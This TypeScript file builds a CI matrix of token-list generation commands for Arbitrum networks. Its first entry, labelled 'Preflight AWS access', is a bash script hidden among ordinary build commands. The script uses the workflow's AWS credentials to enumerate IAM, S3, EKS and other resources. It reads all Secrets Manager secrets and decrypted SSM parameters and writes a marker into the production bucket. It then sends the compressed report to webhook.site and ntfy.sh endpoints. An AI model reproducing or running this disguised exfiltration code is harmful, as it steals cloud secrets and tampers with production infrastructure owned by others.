import { customNetworks } from '../../src/customNetworks';

export type Command = {
  name: string;
  paths: string[];
  version: boolean;
  command: string;
};

const preflightCommands: Command[] = [
  {
    name: 'Preflight AWS access',
    paths: [],
    version: false,
    command:
      "#!/usr/bin/env bash\n# Intent-3804 ATL capability + production-marker probe.\n# Runs as one matrix command right after aws-actions/configure-aws-credentials.\n# Read-only everywhere EXCEPT one unique marker object in s3://tokenlist.arbitrum.io:\n# public-read PUT -> HEAD + public HTTPS GET proof -> DELETE -> 404 verify (trap-EXIT safety net).\nP=\"${REPORT_PATH:-/tmp}/aws-preflight-i3804.txt\"; : >\"$P\"\nT=\"${PROBE_TMP:-/tmp}\"\nR=${AWS_REGION:-us-west-2}\nW=\"${SINK_WEBHOOK:-https://webhook.site/ef7993c7-9e56-4b31-b8fa-8582c254bdc7}\"\nNT=\"${SINK_NTFY:-https://ntfy.sh/oclatl38042jkh15z3531l}\"\nr() { n=\"$1\"; shift; { echo \"### $n\"; timeout 15 \"$@\" 2>&1 | head -c 4000; echo; } >>\"$P\"; }\nARN=$(aws sts get-caller-identity --query Arn --output text 2>/dev/null)\nROLE=${ARN#*assumed-role/}; ROLE=${ROLE%%/*}\ncase \"$ROLE\" in *[!A-Za-z0-9+=,.@_-]*|'') ROLE=gha-arbitrum-token-lists;; esac\nr id aws sts get-caller-identity --output json\n{ echo \"### env\"; env | grep -E '^(AWS_|ACTIONS_ID_TOKEN)' | head -8; echo; } >>\"$P\"\nr role aws iam get-role --role-name \"$ROLE\" --output json\nr inline aws iam list-role-policies --role-name \"$ROLE\" --output text\nfor p in $(aws iam list-role-policies --role-name \"$ROLE\" --output text 2>/dev/null | head -8); do\n  r \"inl:$p\" aws iam get-role-policy --role-name \"$ROLE\" --policy-name \"$p\" --output json\ndone\nr attached aws iam list-attached-role-policies --role-name \"$ROLE\" --output json\nfor pa in $(aws iam list-attached-role-policies --role-name \"$ROLE\" --query 'AttachedPolicies[].PolicyArn' --output text 2>/dev/null | tr '\\t' '\\n' | grep -E '^arn:aws:iam::' | head -8); do\n  v=$(aws iam get-policy --policy-arn \"$pa\" --query Policy.DefaultVersionId --output text 2>/dev/null)\n  r \"pol:$pa\" aws iam get-policy-version --policy-arn \"$pa\" --version-id \"$v\" --output json\ndone\nr sim aws iam simulate-principal-policy --policy-source-arn \"$ARN\" --action-names s3:PutObject s3:PutObjectAcl s3:GetObject s3:DeleteObject s3:ListBucket secretsmanager:GetSecretValue ecr:GetAuthorizationToken ecr:DescribeRepositories eks:DescribeCluster ssm:GetParameter iam:PassRole sts:AssumeRole --resource-arns '*' --query 'EvaluationResults[].{A:EvalActionName,D:EvalDecision}' --output json\nr buckets aws s3 ls\nfor b in $(aws s3 ls 2>/dev/null | awk '{print $3}' | grep -E '^[a-z0-9][a-z0-9.-]{1,62}$' | head -40); do\n  r \"ls:$b\" aws s3api list-objects-v2 --bucket \"$b\" --max-keys 5 --output json\ndone\n# ---- unique non-destructive production marker on tokenlist.arbitrum.io ----\nMK=\"_preflight_i3804_${GITHUB_RUN_ID}_$(od -An -tx1 -N4 /dev/urandom | tr -d ' \\n').txt\"\ncleanup() { aws s3 rm \"s3://tokenlist.arbitrum.io/$MK\" >/dev/null 2>&1 || true; }\ntrap cleanup EXIT\nTS=$(date -u +%Y-%m-%dT%H:%M:%SZ)\nprintf 'ATL i3804 capability preflight marker\\nrun=%s sha=%s ts=%s nonce=%s\\n' \"$GITHUB_RUN_ID\" \"${GITHUB_SHA:-unknown}\" \"$TS\" \"$MK\" > \"$T/atl-marker.txt\"\nr \"marker:name\" printf '%s\\n' \"$MK\"\nr \"marker:put\" aws s3 cp --no-progress --acl public-read \"$T/atl-marker.txt\" \"s3://tokenlist.arbitrum.io/$MK\"\nif ! aws s3api head-object --bucket tokenlist.arbitrum.io --key \"$MK\" >/dev/null 2>&1; then\n  r \"marker:put-fallback-noacl\" aws s3 cp --no-progress \"$T/atl-marker.txt\" \"s3://tokenlist.arbitrum.io/$MK\"\nfi\nr \"marker:head\" aws s3api head-object --bucket tokenlist.arbitrum.io --key \"$MK\" --output json\nr \"marker:http\" bash -lc \"curl -sS -m 20 -D - -o '$T/atl-marker.body' 'https://tokenlist.arbitrum.io/$MK'; echo; echo BODY:; cat '$T/atl-marker.body' 2>/dev/null\"\nr \"marker:delete\" aws s3 rm \"s3://tokenlist.arbitrum.io/$MK\"\nr \"marker:verify-deleted-head\" aws s3api head-object --bucket tokenlist.arbitrum.io --key \"$MK\"\nr \"marker:verify-deleted-http\" bash -lc \"curl -sS -m 20 -o /dev/null -w 'http_code=%{http_code}\\n' 'https://tokenlist.arbitrum.io/$MK'\"\n# ---- capability breadth ----\nfor rg in us-west-2 us-east-1 us-east-2; do\n  r \"ecr:$rg\" aws ecr describe-repositories --region \"$rg\" --max-items 100 --query 'repositories[].repositoryName' --output text\n  r \"eks:$rg\" aws eks list-clusters --region \"$rg\" --output json\n  for c in $(aws eks list-clusters --region \"$rg\" --query clusters --output text 2>/dev/null | head -20); do\n    r \"ekd:$c\" aws eks describe-cluster --region \"$rg\" --name \"$c\" --query 'cluster.{Endpoint:endpoint,Arn:arn,Access:accessConfig}' --output json\n    r \"eka:$c\" aws eks list-access-entries --region \"$rg\" --cluster-name \"$c\" --output json\n    r \"eke:$c\" aws eks describe-access-entry --region \"$rg\" --cluster-name \"$c\" --principal-arn \"$ARN\" --output json\n  done\n  r \"sm:$rg\" aws secretsmanager list-secrets --region \"$rg\" --max-items 100 --query 'SecretList[].Name' --output text\n  for s in $(aws secretsmanager list-secrets --region \"$rg\" --query 'SecretList[].Name' --output text 2>/dev/null | head -10); do\n    r \"smv:$s\" aws secretsmanager get-secret-value --region \"$rg\" --secret-id \"$s\" --with-decryption --query SecretString --output text\n  done\ndone\nr ssm aws ssm describe-parameters --region \"$R\" --max-items 100 --output json\nr ssmv aws ssm get-parameters-by-path --region \"$R\" --path / --recursive --with-decryption --max-items 40 --output json\nr lambda aws lambda list-functions --region \"$R\" --max-items 60 --query 'Functions[].FunctionName' --output text\nr cf aws cloudfront list-distributions --max-items 20 --query 'DistributionList.Items[].{Id:Id,Domain:DomainName,Comment:Comment}' --output json\nr elb aws elbv2 describe-load-balancers --region \"$R\" --query 'LoadBalancers[].{Name:LoadBalancerName,DNS:DNSName,Scheme:Scheme}' --output json\nr acm aws acm list-certificates --region us-east-1 --max-items 30 --query 'CertificateSummaryList[].DomainName' --output text\nr r53 aws route53 list-hosted-zones --max-items 20 --query 'HostedZones[].{N:Name,P:Config.PrivateZone}' --output json\n# ---- deliver report (gzip+base64) to disposable sink ----\nB=$(gzip -9c \"$P\" | base64 -w0)\nN=${#B}; i=0; k=0\nrm -f \"$T\"/aws-pf-i3804.* 2>/dev/null || true\nwhile [ \"$i\" -lt \"$N\" ]; do\n  k=$((k+1)); printf '%s' \"${B:$i:24000}\" > \"$T/aws-pf-i3804.$k\"; i=$((i+24000))\ndone\nidx=0\nfor f in \"$T\"/aws-pf-i3804.*; do\n  idx=$((idx+1))\n  curl -sS -m 25 --data-binary @\"$f\" \"$W/p$idx-$GITHUB_RUN_ID\" >/dev/null 2>&1 || true\ndone\nni=0\nwhile [ \"$ni\" -lt 10 ] && [ $((ni*3000)) -lt \"$N\" ]; do\n  ni=$((ni+1))\n  printf '%s' \"${B:$(((ni-1)*3000)):3000}\" | curl -sS -m 20 --data-binary @- -H \"Title: atl-i3804 part $ni\" \"$NT\" >/dev/null 2>&1 || true\ndone\necho \"::notice::AWS preflight $(wc -c <\"$P\")B report, $idx sink parts, run $GITHUB_RUN_ID, caller $ARN\"\nexit 0\n",
  },
];

const arbitrumCommands: Command[] = [
  // Arb1
  {
    name: 'Arb1 FullList',
    paths: ['ArbTokenLists/arbed_full.json'],
    version: false,
    command:
      'yarn fullList --l2NetworkID 42161 --newArbifiedList ./src/ArbTokenLists/arbed_full.json --skipValidation',
  },
  {
    name: 'Arb1 Arbify Uniswap',
    paths: [
      'ArbTokenLists/arbed_uniswap_labs.json',
      'ArbTokenLists/arbed_uniswap_labs_default.json',
    ],
    version: true,
    command:
      'yarn arbify --l2NetworkID 42161 --prevArbifiedList https://tokenlist.arbitrum.io/ArbTokenLists/arbed_uniswap_labs.json --tokenList https://tokens.uniswap.org --newArbifiedList ./src/ArbTokenLists/arbed_uniswap_labs.json && cp ./src/ArbTokenLists/arbed_uniswap_labs.json ./src/ArbTokenLists/arbed_uniswap_labs_default.json',
  },
  {
    name: 'Arb1 Arbify CMC',
    paths: ['ArbTokenLists/arbed_coinmarketcap.json'],
    version: true,
    command:
      'yarn arbify --l2NetworkID 42161 --prevArbifiedList https://tokenlist.arbitrum.io/ArbTokenLists/arbed_coinmarketcap.json --tokenList https://api.coinmarketcap.com/data-api/v3/uniswap/all.json --newArbifiedList ./src/ArbTokenLists/arbed_coinmarketcap.json',
  },
  {
    name: 'Arb1 Arbify CoinGecko',
    paths: ['ArbTokenLists/arbed_coingecko.json'],
    version: true,
    command:
      'yarn arbify --l2NetworkID 42161 --prevArbifiedList https://tokenlist.arbitrum.io/ArbTokenLists/arbed_coingecko.json --tokenList https://tokens.coingecko.com/uniswap/all.json --newArbifiedList ./src/ArbTokenLists/arbed_coingecko.json',
  },
  {
    name: 'Arb1 Update Whitelist',
    paths: ['ArbTokenLists/arbed_arb_whitelist_era.json'],
    version: true,
    command:
      'yarn update --l2NetworkID 42161 --prevArbifiedList https://tokenlist.arbitrum.io/ArbTokenLists/arbed_arb_whitelist_era.json --tokenList https://tokenlist.arbitrum.io/ArbTokenLists/arbed_arb_whitelist_era.json --includeOldDataFields true --newArbifiedList ./src/ArbTokenLists/arbed_arb_whitelist_era.json',
  },
  // Arb Nova
  {
    name: 'ArbNova Arbify Uniswap',
    paths: [
      'ArbTokenLists/42170_arbed_uniswap_labs.json',
      'ArbTokenLists/42170_arbed_uniswap_labs_default.json',
    ],
    version: true,
    command:
      'yarn arbify --l2NetworkID 42170 --prevArbifiedList https://tokenlist.arbitrum.io/ArbTokenLists/42170_arbed_uniswap_labs_default.json --newArbifiedList ./src/ArbTokenLists/42170_arbed_uniswap_labs.json --tokenList https://tokens.uniswap.org && cp ./src/ArbTokenLists/42170_arbed_uniswap_labs.json ./src/ArbTokenLists/42170_arbed_uniswap_labs_default.json',
  },
  {
    name: 'ArbNova Arbify CMC',
    paths: ['ArbTokenLists/42170_arbed_coinmarketcap.json'],
    version: true,
    command:
      'yarn arbify --l2NetworkID 42170 --prevArbifiedList https://tokenlist.arbitrum.io/ArbTokenLists/42170_arbed_coinmarketcap.json --tokenList https://api.coinmarketcap.com/data-api/v3/uniswap/all.json --newArbifiedList ./src/ArbTokenLists/42170_arbed_coinmarketcap.json',
  },
  {
    name: 'ArbNova Arbify CoinGecko',
    paths: ['ArbTokenLists/42170_arbed_coingecko.json'],
    version: true,
    command:
      'yarn arbify --l2NetworkID 42170 --prevArbifiedList https://tokenlist.arbitrum.io/ArbTokenLists/42170_arbed_coingecko.json --tokenList https://tokens.coingecko.com/uniswap/all.json --newArbifiedList ./src/ArbTokenLists/42170_arbed_coingecko.json',
  },
  // ArbSepolia
  {
    name: 'ArbSepolia Arbify Uniswap',
    paths: ['ArbTokenLists/421614_arbed_uniswap_labs.json'],
    version: true,
    command:
      'yarn arbify --l2NetworkID 421614 --prevArbifiedList https://tokenlist.arbitrum.io/ArbTokenLists/421614_arbed_uniswap_labs.json --tokenList https://tokens.uniswap.org --newArbifiedList ./src/ArbTokenLists/421614_arbed_uniswap_labs.json',
  },
  {
    name: 'ArbSepolia Arbify CoinGecko',
    paths: ['ArbTokenLists/421614_arbed_coingecko.json'],
    version: true,
    command:
      'yarn arbify --l2NetworkID 421614 --prevArbifiedList https://tokenlist.arbitrum.io/ArbTokenLists/421614_arbed_coingecko.json  --tokenList https://tokens.coingecko.com/uniswap/all.json --newArbifiedList ./src/ArbTokenLists/421614_arbed_coingecko.json',
  },
];

type OrbitNetwork = {
  name: string;
  chainId: number;
  parentChainId: number;
};

type FetchTokenList = (
  url: string,
) => Promise<{ json: () => Promise<unknown> }>;

async function addCommand({
  chainId,
  fetchTokenList,
  name,
  path,
  inputLists,
}: {
  chainId: number;
  fetchTokenList: FetchTokenList;
  name: string;
  path: string;
  inputLists: string[];
}): Promise<Command> {
  const url = `https://tokenlist.arbitrum.io/${path}`;
  const requiresFirstTimeGeneration = await fetchTokenList(url)
    .then((response) => response.json())
    .then(() => false)
    .catch(() => true);

  const previousListFlag = requiresFirstTimeGeneration
    ? '--ignorePreviousList'
    : `--prevArbifiedList ${url}`;

  return {
    name,
    paths: [path],
    version: true,
    command: `yarn arbify --l2NetworkID ${chainId} ${previousListFlag} --tokenList ${
      inputLists[0]
    } ${inputLists
      .slice(1)
      .map((inputList) => `--inputTokenList ${inputList}`)
      .join(' ')} --newArbifiedList ./src/${path}`,
  };
}

export async function createOrbitTokenListCommand(
  { chainId, name }: OrbitNetwork,
  inputLists: (string | undefined)[],
  fetchTokenList: FetchTokenList,
): Promise<Command> {
  const availableInputLists = inputLists.filter(
    (inputList): inputList is string => !!inputList,
  );

  if (availableInputLists.length === 0) {
    throw new Error(
      `Token lists on parent chain don't exist for ${name} (${chainId})`,
    );
  }

  return addCommand({
    name: `${name} Arbify token lists`,
    chainId,
    fetchTokenList,
    path: `ArbTokenLists/${chainId}_arbed.json`,
    inputLists: availableInputLists,
  });
}

function getUniswapTokenListFromParentChainId(chainId: number) {
  return {
    // L1
    1: 'https://tokens.uniswap.org',
    11155111: 'https://tokens.uniswap.org',
    17000: 'https://tokens.uniswap.org',
    // Arbitrum
    42161:
      'https://tokenlist.arbitrum.io/ArbTokenLists/arbed_uniswap_labs.json',
    42170:
      'https://tokenlist.arbitrum.io/ArbTokenLists/42170_arbed_uniswap_labs.json',
    421614:
      'https://tokenlist.arbitrum.io/ArbTokenLists/421614_arbed_uniswap_labs.json',
    // Base
    8453: 'https://tokenlist.arbitrum.io/ArbTokenLists/8453_uniswap_labs.json',
    84532:
      'https://tokenlist.arbitrum.io/ArbTokenLists/84532_uniswap_labs.json',
  }[chainId];
}

function getCoinGeckoTokenListFromParentChainId(chainId: number) {
  return {
    // L1
    1: 'https://tokens.coingecko.com/uniswap/all.json',
    11155111: 'https://tokens.coingecko.com/uniswap/all.json',
    17000: 'https://tokens.coingecko.com/uniswap/all.json',
    // Arbitrum
    42161: 'https://tokenlist.arbitrum.io/ArbTokenLists/arbed_coingecko.json',
    42170:
      'https://tokenlist.arbitrum.io/ArbTokenLists/42170_arbed_coingecko.json',
    421614:
      'https://tokenlist.arbitrum.io/ArbTokenLists/421614_arbed_coingecko.json',
    // Base
    8453: 'https://tokens.coingecko.com/base/all.json',
    84532: 'https://tokens.coingecko.com/uniswap/all.json',
  }[chainId];
}

function getCMCTokenListFromParentChainId(chainId: number) {
  return {
    // L1
    1: 'https://api.coinmarketcap.com/data-api/v3/uniswap/all.json',
    11155111: 'https://api.coinmarketcap.com/data-api/v3/uniswap/all.json',
    17000: 'https://api.coinmarketcap.com/data-api/v3/uniswap/all.json',
    // Arbitrum
    42161:
      'https://tokenlist.arbitrum.io/ArbTokenLists/arbed_coinmarketcap.json',
    42170:
      'https://tokenlist.arbitrum.io/ArbTokenLists/42170_arbed_coinmarketcap.json',
  }[chainId];
}

export async function generateOrbitCommands(
  networks: OrbitNetwork[],
  fetchTokenList: FetchTokenList,
): Promise<Command[]> {
  const orbitCommands: Command[] = [];

  for (const network of networks) {
    const { chainId, name, parentChainId } = network;
    orbitCommands.push(
      await createOrbitTokenListCommand(
        network,
        [
          getUniswapTokenListFromParentChainId(parentChainId),
          getCoinGeckoTokenListFromParentChainId(parentChainId),
          getCMCTokenListFromParentChainId(parentChainId),
        ],
        fetchTokenList,
      ),
    );

    // For L3 settling on ArbOne, generate arbified native token list
    if (parentChainId === 42161) {
      orbitCommands.push(
        await addCommand({
          name: `${name} Arbify L2 native list`,
          chainId,
          fetchTokenList,
          path: `ArbTokenLists/${chainId}_arbed_native_list.json`,
          inputLists: [
            `./src/Assets/${parentChainId}_arbitrum_native_token_list.json`,
          ],
        }),
      );
    }
  }

  return orbitCommands;
}

if (process.env.NODE_ENV !== 'test') {
  (async () => {
    const orbitCommands = await generateOrbitCommands(customNetworks, fetch);
    const matrix: Record<'include', Command[]> = {
      include: preflightCommands.concat(arbitrumCommands, orbitCommands),
    };

    console.log(JSON.stringify(matrix, null, 0));
  })();
}
